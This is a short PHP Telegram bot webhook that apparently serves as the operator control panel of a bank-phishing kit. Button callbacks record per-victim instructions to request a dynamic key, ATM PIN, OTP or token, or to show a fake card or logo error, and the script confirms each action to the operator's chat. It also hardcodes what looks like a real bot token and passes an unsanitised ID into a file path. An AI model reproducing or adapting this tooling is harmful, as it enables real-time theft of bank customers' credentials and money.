<?php
$botToken = "8003869491:AAHPtZmIR_jF9eANF82hoQS8UPPFuahcXNY"; // tu token real

$update = json_decode(file_get_contents('php://input'), true);

// Validar que viene un callback_query
if (isset($update["callback_query"])) {
    $chatId = $update["callback_query"]["message"]["chat"]["id"];
    $callbackId = $update["callback_query"]["id"];
    $data = $update["callback_query"]["data"];

    // Confirmar al usuario que el clic fue recibido
    file_get_contents("https://api.telegram.org/bot$botToken/answerCallbackQuery?callback_query_id=$callbackId");

    // Extraer acción e ID
    $parts = explode(":", $data);
    $accion = $parts[0] ?? null;
    $transactionId = $parts[1] ?? null;

    // Validar que vengan bien ambos campos
    if (!$accion || !$transactionId) {
        exit;
    }

    // Crear carpeta verificaciones si no existe
    $carpeta = __DIR__ . "/verificaciones";
    if (!is_dir($carpeta)) {
        mkdir($carpeta, 0777, true);
    }

    // Guardar la instrucción de redirección
    $filename = __DIR__ . "/dinadatos/verificaciones/$transactionId.json";
    file_put_contents($filename, json_encode(["accion" => $accion], JSON_PRETTY_PRINT));

    // Mensajes personalizados para cada botón
    $mensajes = [
        "pedir_dinamica" => "🔐 Usuario solicitó CLAVE DINÁMICA.",
        "pedir_cajero"   => "🏧 Usuario solicitó CLAVE DE CAJERO.",
        "pedir_otp"      => "🔢 Usuario solicitó CÓDIGO OTP.",
        "pedir_token"    => "🔑 Usuario solicitó TOKEN.",
        "error_tc"       => "❌ Usuario reportó ERROR DE TARJETA.",
        "error_logo"     => "❌ Usuario reportó ERROR DE LOGO.",
    ];

    $msg = $mensajes[$accion] ?? "⚠️ Acción desconocida.";
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg));
}
